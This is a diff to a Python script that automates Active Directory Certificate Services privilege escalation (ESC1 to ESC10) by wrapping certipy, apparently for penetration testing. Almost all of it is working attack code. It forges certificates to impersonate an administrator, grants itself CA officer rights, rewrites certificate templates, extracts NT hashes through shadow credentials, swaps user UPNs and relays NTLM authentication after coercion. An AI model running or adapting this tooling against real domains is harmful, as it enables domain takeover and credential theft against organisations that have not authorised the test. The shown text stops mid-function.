@@ -30,13 +30,16 @@ parser.add_argument("-D", "--dcip", required=True, help="DCIP")
 parser.add_argument("-u", "--username", required=True, help="Username")
 parser.add_argument("-p", "--password", required=True, help="Password")
 parser.add_argument("-v", "--victim", default="administrator", help="User to run against if not administrator (administrator is default)")
-parser.add_argument("-t", "--target", required=True, help="FQDN of Certificate Authority (DNS name in certificate) (ex CA.NWRT.LOCAL)")
+parser.add_argument("-t", "--target", required=True, help="FQDN of Certificate Authority (DNS name in certificate) (ex CA.SOMETHING.LOCAL)")
 parser.add_argument("-5", "--esc5", action="store_true", help="Run ESC5, usually certipy does not see this one")
 parser.add_argument("-10", "--esc10", action="store_true", help="Run ESC10, this cannot be tested for by Certipy Find")
 parser.add_argument("-r", "--revert", action="store_true", help="Used after running ESC4, this will revert template back to original template")
 parser.add_argument("-j", "--json", help="JSON template used with revert command, only use after exploitation with ESC4")
 parser.add_argument("-e", "--templ", help="Template name used with revert command (which template had ESC4 vulnerable)")
 parser.add_argument("-pr", "--proxy", action="store_true", help="If going through proxychains (still do a proxychains -q python3 esc.py...)")
+parser.add_argument("-T", "--timeout", type=int, default=None, help="Timeout in seconds for certipy connections (passed as -timeout to certipy-ad)")
+parser.add_argument("-c", "--certipyfile", help="Path to existing certipy find output file (skip running certipy find again)")
+parser.add_argument("-b", "--bin", dest="certipy_bin", default=None, help="Certipy binary name (default: auto-detect certipy-ad or certipy)")
 
 args = parser.parse_args()
 
@@ -53,6 +56,19 @@ if args.revert:
     if not args.templ:
         parser.error("--templ is required with --revert")
 
+# Detect certipy binary
+import shutil
+if args.certipy_bin:
+    CERTIPY = args.certipy_bin
+elif shutil.which("certipy-ad"):
+    CERTIPY = "certipy-ad"
+elif shutil.which("certipy"):
+    CERTIPY = "certipy"
+else:
+    print(f"{Fore.RED}[-] Neither certipy-ad nor certipy found in PATH!{Fore.RESET}")
+    sys.exit(1)
+print(f"{Fore.GREEN}[+] Using certipy binary: {Fore.CYAN}{CERTIPY}{Fore.RESET}")
+
 # Extract arguments
 username = args.username
 password = args.password
@@ -63,19 +79,22 @@ target = args.target
 five = args.esc5
 ten = args.esc10
 proxy = args.proxy
+timeout = args.timeout
 msg = f"{green}[*] Running: {cyan}"
-auth_cmd = f"certipy auth -pfx {victim}.pfx -dc-ip {ip} -domain {domain}"
+auth_cmd = f"{CERTIPY} auth -pfx {victim}.pfx -dc-ip {ip} -domain {domain}" + (f" -timeout {timeout}" if timeout else "")
 
 #Utilized to compile certipy and esc together
 #certipy_exe = os.path.join(os.path.dirname(sys.argv[0]), "certipy")
 
 def add_proxy_opts(cmd):
-    global proxy, ip
+    global proxy, ip, timeout
     if proxy:
         if not ip:
             print("[-] Proxy enabled but no DC IP provided!")
             return cmd
-        return f"{cmd} -dns-tcp -ns {ip}"
+        cmd = f"{cmd} -dns-tcp -ns {ip}"
+    if timeout is not None:
+        cmd = f"{cmd} -timeout {timeout}"
     return cmd
 
 def describe_esc(esc):
@@ -90,7 +109,11 @@ def describe_esc(esc):
         "ESC8": f"{red}Vulnerable web enrollment endpoint anbd at least one certificate template enabled that allows domain computer enrollment and client authentication{reset}",
         "ESC9": f"{red}Dangerous permissions allow tampering with template ACLs.{reset}",
         "ESC10": f"{red}Abuses StrongCertificateBindingEnforcement or CertificateMappingMethods registry keys and spoofs UPN{reset}",
-        "ESC11": f"{red}Abuses IF_ENFORCEENCRYPTICERTREQUEST between client and CA{reset}"
+        "ESC11": f"{red}Abuses IF_ENFORCEENCRYPTICERTREQUEST between client and CA{reset}",
+        "ESC13": f"{red}Issuance policy linked to privileged group via msDS-OIDToGroupLink (inherits group permissions via TGT){reset}",
+        "ESC15": f"{red}V1 schema template allows application policy injection (CVE-2024-49019, unpatched CAs only){reset}",
+        "ESC16": f"{red}SID extension disabled globally on CA, all templates vulnerable to UPN mapping abuse{reset}",
+        "ESC17": f"{red}Server Auth + Enrollee Supplies Subject, enables server impersonation (WSUS hijack, MitM, etc.){reset}"
     }
     return descriptions.get(esc, "Unknown vulnerability.")
 
@@ -300,31 +323,32 @@ def revert_esc4(template_name, ca_name, json_file):
     print(f"{green}[+] Reverting {args.json} back to orginial template{reset}")
     print(f"{red}[!] When asked, y to both questions{reset}")
     time.sleep(3)
-    cmd = add_proxy_opts(f"certipy template -u {username}@{domain} -p {password} -template {args.templ} -write-configuration {args.json}")
+    cmd = add_proxy_opts(f"{CERTIPY} template -u {username}@{domain} -p {password} -template {args.templ} -write-configuration {args.json}")
     print(f"{msg} {cyan}{cmd} {reset}")
     subprocess.call(cmd, shell=True)
 
 def run_certipy_find():
+    t_opt = f" -timeout {timeout}" if timeout else ""
     if proxy:
         output_filename = f"certipy_find_{timestamp}.txt"
-    
+
         # First attempt (fast, may fail parsing under proxychains)
-        cmd1 = f"certipy find -u {username}@{domain} -p {password} -dc-ip {ip} -dns-tcp -ns {ip} -stdout -enabled -vulnerable | tee {output_filename}"
+        cmd1 = f"{CERTIPY} find -u {username}@{domain} -p {password} -dc-ip {ip} -dns-tcp -ns {ip}{t_opt} -stdout -enabled -vulnerable | tee {output_filename}"
         print(f"{msg} {cyan}{cmd1} {reset}")
         subprocess.call(cmd1, shell=True)
-    
+
         # Fallback always runs next — deeper but more resilient to partial parsing
         print(f"{yellow}[*] Running again without -enabled and -vulnerable due to proxychains limitations{reset}")
-        cmd2 = f"certipy find -u {username}@{domain} -p {password} -dc-ip {ip} -dns-tcp -ns {ip} -stdout | tee {output_filename}"
+        cmd2 = f"{CERTIPY} find -u {username}@{domain} -p {password} -dc-ip {ip} -dns-tcp -ns {ip}{t_opt} -stdout | tee {output_filename}"
         subprocess.call(cmd2, shell=True)
 
         return output_filename
     else:
         output_filename = f"certipy_find_{timestamp}.txt"
-        cmd = f"certipy find -u {username}@{domain} -p {password} -dc-ip {ip} -stdout -vulnerable -enabled | tee {output_filename}"
+        cmd = f"{CERTIPY} find -u {username}@{domain} -p {password} -dc-ip {ip}{t_opt} -stdout -vulnerable -enabled | tee {output_filename}"
         print(f"{msg} {cyan}{cmd} {reset}")
         subprocess.call(cmd, shell=True)
-        return output_filename   
+        return output_filename
 
 def extract_sid(output):
     for line in output.splitlines():
@@ -341,13 +365,15 @@ def get_sid_from_command(cmd):
 
 def run_cert_request_auto(ca, template, victim):
     req_cmd = [
-        "certipy", "req",
+        CERTIPY, "req",
         "-u", f"{username}@{domain}",
         "-p", password,
         "-ca", ca,
         "-template", template,
         "-upn", victim
     ]
+    if timeout is not None:
+        req_cmd += ["-timeout", str(timeout)]
     
     print(f"{msg} {' '.join(req_cmd)} {reset}")
     print(f"{red}[!] Attempting certificate request, will auto-save key if prompted{reset}")
@@ -392,7 +418,7 @@ def run_cert_request_auto(ca, template, victim):
 def run_esc1(template, ca):
     print(f"{green}[*] Running ESC1 attack using Template: {template}, CA: {ca} {reset}")
 
-    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
+    sid_cmd = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
     print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")
 
     sid = get_sid_from_command(sid_cmd)
@@ -402,9 +428,16 @@ def run_esc1(template, ca):
         print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
         return
 
-    esc1_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target} -sid {sid} -upn {victim}@{domain}")
+    # Try with -sid first (certipy v5 style)
+    esc1_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target} -sid {sid} -upn {victim}")
     print(f"{msg} ESC1 attack with: {cyan}{esc1_cmd} {reset}")
-    subprocess.call(esc1_cmd, shell=True)
+    ret = subprocess.call(esc1_cmd, shell=True)
+
+    if ret != 0 or not os.path.exists(f"{victim}.pfx"):
+        print(f"{yellow}[!] First attempt failed, retrying without -sid (certipy v4 style){reset}")
+        esc1_cmd_nosid = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target} -upn {victim}")
+        print(f"{msg} ESC1 fallback with: {cyan}{esc1_cmd_nosid} {reset}")
+        subprocess.call(esc1_cmd_nosid, shell=True)
 
     print(f"{msg} Running {cyan}{auth_cmd}{reset}")
     subprocess.call(auth_cmd, shell=True)
@@ -412,7 +445,7 @@ def run_esc1(template, ca):
 def run_esc2(template, ca):
     print(f"{green}[*] Running ESC2 attack using Template: {template}, CA: {ca} {reset}")
 
-    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
+    sid_cmd = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
     print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")
     sid = get_sid_from_command(sid_cmd)
 
@@ -422,7 +455,7 @@ def run_esc2(template, ca):
         print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
         return
 
-    sid_cmd_username = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
+    sid_cmd_username = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
     print(f"{msg} Getting {username} SID with: {cyan}{sid_cmd_username} {reset}")
     sid_user = get_sid_from_command(sid_cmd_username)
 
@@ -432,18 +465,18 @@ def run_esc2(template, ca):
         print(f"{red}[-] Failed to extract SID for user {username} {reset}")
         return
 
-    esc2_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target} -sid {sid_user}")
+    esc2_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target} -sid {sid_user}")
     print(f"{msg} ESC2 attack with: {cyan}{esc2_cmd} {reset}")
     subprocess.call(esc2_cmd, shell=True)
 
-    esc2_pfx_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template user -ca {ca} -target {target} -pfx {username}.pfx -on-behalf-of {domain}\\{victim} -sid {sid}")
+    esc2_pfx_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -dc-ip {ip} -template user -ca {ca} -target {target} -pfx {username}.pfx -on-behalf-of {domain}\\{victim} -sid {sid}")
     print(f"{msg} Running {cyan}{esc2_pfx_cmd}{reset}")
     subprocess.call(esc2_pfx_cmd, shell=True)
 
 def run_esc2_1(template, ca):
     print(f"{green}[*] Running ESC2 attack using Template: {template}, CA: {ca} {reset}")
 
-    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
+    sid_cmd = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
     print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")
     sid = get_sid_from_command(sid_cmd)
 
@@ -453,7 +486,7 @@ def run_esc2_1(template, ca):
         print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
         return
 
-    sid_cmd_username = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
+    sid_cmd_username = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
     print(f"{msg} Getting {username} SID with: {cyan}{sid_cmd_username} {reset}")
     sid_user = get_sid_from_command(sid_cmd_username)
 
@@ -463,7 +496,7 @@ def run_esc2_1(template, ca):
         print(f"{red}[-] Failed to extract SID for user {username} {reset}")
         return
 
-    esc2_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target} -sid {sid} -upn {victim} -domain {domain}")
+    esc2_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target} -sid {sid} -upn {victim}")
     print(f"{msg} ESC2 attack with: {cyan}{esc2_cmd} {reset}")
     subprocess.call(esc2_cmd, shell=True)
 
@@ -473,7 +506,7 @@ def run_esc2_1(template, ca):
 def run_esc3(template, ca):
     print(f"{green}[*] Running ESC3 attack using Template: {template}, CA: {ca} {reset}")
 
-    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
+    sid_cmd = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
     print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")
     sid = get_sid_from_command(sid_cmd)
 
@@ -483,7 +516,7 @@ def run_esc3(template, ca):
         print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
         return
 
-    sid_cmd_username = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
+    sid_cmd_username = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
     print(f"{msg} Getting {username} SID with: {cyan}{sid_cmd_username} {reset}")
     sid_user = get_sid_from_command(sid_cmd_username)
 
@@ -493,18 +526,18 @@ def run_esc3(template, ca):
         print(f"{red}[-] Failed to extract SID for user {username} {reset}")
         return
 
-    esc3_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target}")
+    esc3_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target}")
     print(f"{msg} ESC3 attack with: {cyan}{esc3_cmd} {reset}")
     subprocess.call(esc3_cmd, shell=True)
 
-    esc3_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template user -pfx {username}.pfx -on-behalf-of {domain}\\{victim} -ca {ca} -target {target}")
+    esc3_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -dc-ip {ip} -template user -pfx {username}.pfx -on-behalf-of {domain}\\{victim} -ca {ca} -target {target}")
     print(f"{msg} ESC3 attack with domain account: {cyan}{esc3_cmd} {reset}")
     subprocess.call(esc3_cmd, shell=True)
 
     print(f"{msg} Running {cyan}{auth_cmd}{reset}")
     subprocess.call(auth_cmd, shell=True)
 
-    esc3_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template user -pfx {username}.pfx -on-behalf-of {victim} -ca {ca} -target {target}")
+    esc3_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -dc-ip {ip} -template user -pfx {username}.pfx -on-behalf-of {victim} -ca {ca} -target {target}")
     print(f"{msg} ESC3 attack with local account: {cyan}{esc3_cmd} {reset}")
     subprocess.call(esc3_cmd, shell=True)
 
@@ -512,7 +545,7 @@ def run_esc3(template, ca):
     subprocess.call(auth_cmd, shell=True)
 
 def run_esc4(template,ca):
-    tmp_cmd = add_proxy_opts(f"certipy template -u {username}@{domain} -p {password} -template {template} -dc-ip {ip} -write-default-configuration")
+    tmp_cmd = add_proxy_opts(f"{CERTIPY} template -u {username}@{domain} -p {password} -template {template} -dc-ip {ip} -write-default-configuration")
     print(f"{msg} ESC4 attack with: {cyan}{tmp_cmd} {reset}")
     print(f"{red}[!] When certipy asks y/n answer should be y{reset}")
     time.sleep(3)
@@ -521,7 +554,7 @@ def run_esc4(template,ca):
     print(f"{red}[!] Run esc.py again and pick and noticed the {template} is vulnerable to ESC1{reset}")
     print(f"{red}[!] To revert to orginial template (needed for cleanup!) run revert with json file that is now within your directory{reset}")
 
-    #sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
+    #sid_cmd = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
     #print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")
 #
     #sid = get_sid_from_command(sid_cmd)
@@ -531,15 +564,15 @@ def run_esc4(template,ca):
     #    print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
     #    return
 #
-    #req_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -upn {victim} -ca {ca} -sid {sid}")
+    #req_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -upn {victim} -ca {ca} -sid {sid}")
     #print(f"{msg} ESC4 attack with: {cyan}{req_cmd} {reset}")
     #subprocess.call(req_cmd, shell=True)
 #
-    #auth_cmd1 = add_proxy_opts(f"certipy auth -pfx {victim}.pfx -username {victim} -domain {domain}")
+    #auth_cmd1 = add_proxy_opts(f"{CERTIPY} auth -pfx {victim}.pfx -username {victim} -domain {domain}")
     #print(f"{msg}{cyan}{auth_cmd1}{reset}")
     #subprocess.call(auth_cmd1, shell=True)
 #
-    #tmp_cmd = add_proxy_opts(f"certipy template -u {username}@{domain} -p {password} -template {template} -write-configuration {template}.json -dc-ip {ip} -no-save")
+    #tmp_cmd = add_proxy_opts(f"{CERTIPY} template -u {username}@{domain} -p {password} -template {template} -write-configuration {template}.json -dc-ip {ip} -no-save")
     #print(f"{red}When certipy asks y/n answer should be y{reset}")
     #subprocess.call(tmp_cmd, shell=True)
     #print(f"{msg}Reset {template} to how we found it{reset}")
@@ -549,7 +582,7 @@ def run_esc5(template, ca):
     target_ip = input(f"{cyan}[?] Target IP (ADCS Server): {reset}")
 
     # Get victim SID
-    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} {proxy_opts} read")
+    sid_cmd = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} {proxy_opts} read")
     print(f"{msg} Getting victim SID with: {cyan}{sid_cmd}{reset}")
     sid = get_sid_from_command(sid_cmd)
 
@@ -559,7 +592,7 @@ def run_esc5(template, ca):
     print(f"{green}[*] Victim SID is: {red}{sid}{reset}")
 
     # Get your SID
-    sid_cmd_username = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
+    sid_cmd_username = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
     print(f"{msg} Getting {username} SID with: {cyan}{sid_cmd_username}{reset}")
     sid_user = get_sid_from_command(sid_cmd_username)
 
@@ -570,9 +603,9 @@ def run_esc5(template, ca):
 
     # Perform the initial request with full opts
     base_req_cmd = (
-        f"certipy req -u {username}@{domain} -p {password} "
+        f"{CERTIPY} req -u {username}@{domain} -p {password} "
         f"-target-ip {target_ip} -ca {ca} -dc-ip {ip} -template {template} "
-        f"-upn {victim}@{domain} -sid {sid}"
+        f"-upn {victim} -sid {sid}"
     )
     req_cmd = add_proxy_opts(base_req_cmd)
     print(f"{msg}{req_cmd}{reset}")
@@ -596,7 +629,7 @@ def run_esc5(template, ca):
         print(f"{green}[+] Extracted Request ID: {request_id}{reset}")
         # Issue the request
         base_ca_cmd2 = (
-            f"certipy ca -u {username}@{domain} -p {password} "
+            f"{CERTIPY} ca -u {username}@{domain} -p {password} "
             f"-target-ip {target_ip} -ca {ca} -dc-ip {ip} "
             f"-issue-request {request_id}"
         )
@@ -606,7 +639,7 @@ def run_esc5(template, ca):
 
         # Retrieve certificate
         base_req_retrieve = (
-        f"certipy req -u {username}@{domain} -p {password} -ca {ca} "
+        f"{CERTIPY} req -u {username}@{domain} -p {password} -ca {ca} "
         f"-target-ip {target_ip} -retrieve {request_id} -dc-ip {ip}"
         )
         req_retrieve = add_proxy_opts(base_req_retrieve)
@@ -616,33 +649,33 @@ def run_esc5(template, ca):
         print(f"{red}[-] Cannot issue or retrieve without request ID!{reset}")
 
     # Attempt auth
-    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim}.pfx -domain {domain} -dc-ip {ip}")
+    a_cmd = add_proxy_opts(f"{CERTIPY} auth -pfx {victim}.pfx -domain {domain} -dc-ip {ip}")
     print(f"{msg}: {cyan}{a_cmd}{reset}")
     subprocess.call(a_cmd, shell=True)
 
 def run_esc6(ca):
-    req_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -ca {ca} -template user -upn {victim}@{domain}")
+    req_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -ca {ca} -template user -upn {victim}")
     print(f"{msg}{req_cmd}{reset}")
     subprocess.call(req_cmd, shell=True)
-    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim}.pfx -domain {domain} -dc-ip {ip}")
+    a_cmd = add_proxy_opts(f"{CERTIPY} auth -pfx {victim}.pfx -domain {domain} -dc-ip {ip}")
     print(f"{msg}: {cyan}{a_cmd} {reset}")
     subprocess.call(a_cmd, shell=True)
 
 def run_esc7(ca):
     # Enable SubCA template first
-    ca_cmd = add_proxy_opts(f"certipy ca -u {username}@{domain} -p {password} -ca {ca} -target {target} -enable-template 'SubCA'")
+    ca_cmd = add_proxy_opts(f"{CERTIPY} ca -u {username}@{domain} -p {password} -ca {ca} -target {target} -enable-template 'SubCA'")
     print(f"{msg}{ca_cmd}{reset}")
     print(f"{cyan}[+] Enabling SubCA template{reset}")
     subprocess.call(ca_cmd, shell=True)
 
     # Add officer rights
-    ca1_cmd = add_proxy_opts(f"certipy ca -u {username}@{domain} -p {password} -ca {ca} -target {target} -add-officer {username}")
+    ca1_cmd = add_proxy_opts(f"{CERTIPY} ca -u {username}@{domain} -p {password} -ca {ca} -target {target} -add-officer {username}")
     print(f"{msg}{ca1_cmd}{reset}")
     print(f"{cyan}[+] Adding {username} as officer to {ca}{reset}")
     subprocess.call(ca1_cmd, shell=True)
 
     # Get victim SID
-    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
+    sid_cmd = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
     print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")
     sid = get_sid_from_command(sid_cmd)
 
@@ -652,7 +685,7 @@ def run_esc7(ca):
         print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
         return
 
-    sid_cmd_username = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
+    sid_cmd_username = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
     print(f"{msg} Getting {username} SID with: {cyan}{sid_cmd_username} {reset}")
     sid_user = get_sid_from_command(sid_cmd_username)
 
@@ -662,7 +695,7 @@ def run_esc7(ca):
         print(f"{red}[-] Failed to extract SID for user {username} {reset}")
         return
 
-    ca1_req = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -ca {ca} -dc-ip {ip} -template 'SubCA' -upn {victim}@{domain} -sid {sid}")
+    ca1_req = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -ca {ca} -dc-ip {ip} -template 'SubCA' -upn {victim} -sid {sid}")
     print(f"{msg}{ca1_req}{reset}")
     subprocess.call(ca1_req, shell=True)
 
@@ -671,18 +704,18 @@ def run_esc7(ca):
 
     if request_id:
         # Issue request
-        ca_cmd2 = add_proxy_opts(f"certipy ca -u {username}@{domain} -p {password} -ca {ca} -dc-ip {ip} -target {target} -issue-request {request_id}")
+        ca_cmd2 = add_proxy_opts(f"{CERTIPY} ca -u {username}@{domain} -p {password} -ca {ca} -dc-ip {ip} -target {target} -issue-request {request_id}")
         print(f"{msg}{ca_cmd2}{reset}")
         subprocess.call(ca_cmd2, shell=True)
 
         # Retrieve issued certificate
-        req_retrieve = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -ca {ca} -target {target} -retrieve {request_id} -dc-ip {ip}")
+        req_retrieve = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -ca {ca} -target {target} -retrieve {request_id} -dc-ip {ip}")
         print(f"{msg}{req_retrieve}{reset}")
         subprocess.call(req_retrieve, shell=True)
     else:
         print(f"{red}[-] Cannot issue or retrieve without request ID!{reset}")
 
-    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim}.pfx -domain {domain} -dc-ip {ip}")
+    a_cmd = add_proxy_opts(f"{CERTIPY} auth -pfx {victim}.pfx -domain {domain} -dc-ip {ip}")
     print(f"{msg}: {cyan}{a_cmd} {reset}")
     subprocess.call(a_cmd, shell=True)
 
@@ -693,7 +726,7 @@ def run_esc8(ca):
     print(f"""{red}[!] You need to do the following in another shell:
         nxc smb <machine to coerce> -M coerce_plus -o LISTENER=<lhost> -o ALWAYS=True -o METHOD=<one of the following PetitPotam, DFSCoerce...""")
     
-    relay_cmd = f"sudo -E certipy relay -target {target_ip} -template DomainController"
+    relay_cmd = f"sudo -E {CERTIPY} relay -target {target_ip} -template DomainController"
     print(f"{msg}{relay_cmd}{reset}")
 
     proc = subprocess.Popen(relay_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
@@ -710,7 +743,7 @@ def run_esc8(ca):
 
     if pfx_file:
         print(f"{green}[+] Detected saved PFX file: {pfx_file}{reset}")
-        auth_cmd = add_proxy_opts(f"certipy auth -pfx {pfx_file}")
+        auth_cmd = add_proxy_opts(f"{CERTIPY} auth -pfx {pfx_file}")
         print(f"{msg}{auth_cmd}{reset}")
         subprocess.call(auth_cmd, shell=True)
     else:
@@ -727,7 +760,7 @@ def run_esc9(template, ca):
     print(f"{msg} DACLedit with: {cyan}{dacl_cmd} {reset}")
     subprocess.call(dacl_cmd, shell=True)
 
-    sha_cmd = add_proxy_opts(f"certipy shadow auto -u '{username}@{domain}' -p '{password}' -account {victim}")
+    sha_cmd = add_proxy_opts(f"{CERTIPY} shadow auto -u '{username}@{domain}' -p '{password}' -account {victim}")
     print(f"{msg} {cyan}{sha_cmd} {reset}")
     proc = subprocess.Popen(sha_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     nt_hash = None
@@ -747,21 +780,21 @@ def run_esc9(template, ca):
     # Continue using nt_hash here
     victim2 = input(f"{cyan}[?] Which user would you like to exploit (ex: administrator): {reset}")
 
-    up_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim2}@{domain}")
+    up_cmd = add_proxy_opts(f"{CERTIPY} account update -u {username}@{domain} -p {password} -user {victim} -upn {victim2}@{domain}")
     print(f"{msg}: {cyan}{up_cmd} {reset}")
     subprocess.call(up_cmd, shell=True)
     print(f"{green}[+] We have updated {red}{victim}{green} UPN to be {red}{victim2}{green} UPN, this will be cleaned up at the end{reset}")
 
-    req_cmd = add_proxy_opts(f"certipy req -u {victim}@{domain} -hashes {nt_hash} -ca {ca} -template {template}")
+    req_cmd = add_proxy_opts(f"{CERTIPY} req -u {victim}@{domain} -hashes {nt_hash} -ca {ca} -template {template}")
     print(f"{msg}: {cyan}{req_cmd} {reset}")
     subprocess.call(req_cmd, shell=True)
 
-    rev_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim}@{domain}")
+    rev_cmd = add_proxy_opts(f"{CERTIPY} account update -u {username}@{domain} -p {password} -user {victim} -upn {victim}@{domain}")
     print(f"{msg}: {cyan}{rev_cmd} {reset}")
     subprocess.call(rev_cmd, shell=True)
     print(f"{green}[+] Account permissions normal again for {red}{victim}{green} and {red}{victim2}{reset}")
 
-    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim2}.pfx -domain {domain} -dc-ip {ip}")
+    a_cmd = add_proxy_opts(f"{CERTIPY} auth -pfx {victim2}.pfx -domain {domain} -dc-ip {ip}")
     print(f"{msg}: {cyan}{a_cmd} {reset}")
     subprocess.call(a_cmd, shell=True)
 
@@ -770,7 +803,7 @@ def run_esc9(template, ca):
 def run_esc10():
     print(f"{green}[+] For this to work The StrongCertificateBindingEnforcement registry key needs to be set to {red}0{green}. However, as a normal user we cannot look at the registry key. This means we would just have to try the exploit{reset}")
     print(f"{green}[+] We also need full control over {red}{victim}{green} with {username}")
-    sha_cmd = add_proxy_opts(f"certipy shadow auto -u {username}@{domain} -p {password} -account {victim}")
+    sha_cmd = add_proxy_opts(f"{CERTIPY} shadow auto -u {username}@{domain} -p {password} -account {victim}")
     print(f"{msg}: {cyan}{sha_cmd} {reset}")
     proc = subprocess.Popen(sha_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     nt_hash = None
@@ -788,28 +821,28 @@ def run_esc10():
         return None
 
     victim2 = input(f"{cyan}[?] Which user would you like to drop the hash for (ex: administrator): {reset}")
-    up_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim2}@{domain}")
+    up_cmd = add_proxy_opts(f"{CERTIPY} account update -u {username}@{domain} -p {password} -user {victim} -upn {victim2}@{domain}")
     print(f"{msg}: {cyan}{up_cmd} {reset}")
     subprocess.call(up_cmd, shell=True)
     print(f"{green}[+] We have updated {red}{victim}{green} UPN to be {red}{victim2}{green} UPN, this will be cleaned up at the end{reset}")
 
-    req_cmd = add_proxy_opts(f"certipy req -u {victim}@{domain} -hashes {nt_hash} -ca {ca} -template user")
+    req_cmd = add_proxy_opts(f"{CERTIPY} req -u {victim}@{domain} -hashes {nt_hash} -ca {ca} -template user")
     print(f"{msg}: {cyan}{req_cmd} {reset}")
     subprocess.call(req_cmd, shell=True)
 
-    rev_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim}@{domain}")
